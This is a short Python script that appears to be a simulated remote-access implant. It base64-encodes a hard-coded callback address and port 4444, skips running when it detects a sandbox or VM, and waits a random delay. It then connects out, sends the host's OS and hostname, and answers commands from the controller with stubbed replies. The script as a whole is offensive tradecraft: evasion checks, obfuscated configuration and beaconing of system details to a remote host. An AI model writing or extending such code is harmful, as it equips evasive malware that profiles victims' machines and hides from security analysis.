import socket
import platform
import time
import random
import string
import base64
import os

def dummy_function():
    _ = [random.randint(1, 100) for _ in range(1000)]
    return sum(_)

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def encode_payload(data):
    return base64.b64encode(data.encode()).decode()

exec_function = getattr(__import__('time'), 'sleep')

def is_sandbox():
    try:
        cpu_count = os.cpu_count()
        if cpu_count is None or cpu_count <= 2:  
            return True
        vm_files = ['C:\\Windows\\System32\\vmguestlib.dll']
        return any(os.path.exists(f) for f in vm_files)
    except:
        return False


def connect_to_server():
    host = encode_payload('192.168.80.132')  
    port = encode_payload('4444')
    
    host = base64.b64decode(host).decode()
    port = int(base64.b64decode(port).decode())
    
    exec_function(random.uniform(5, 10))
    
    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Node: {platform.node()}\n"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        s.sendall(system_info.encode())
        
        while True:
            data = s.recv(1024).decode()
            if not data:
                break
            if data.strip().lower() == 'whoami':
                s.sendall(f"{platform.node()}\\user\n".encode())
            elif data.strip().lower() == 'exit':
                break
            else:
                s.sendall(b"Simulated command received\n")
        
        s.close()
    except Exception as e:
        pass

if not is_sandbox():
    dummy_function()
    exec_name = generate_random_string()
    globals()[exec_name] = connect_to_server
    globals()[exec_name]()
else:
    pass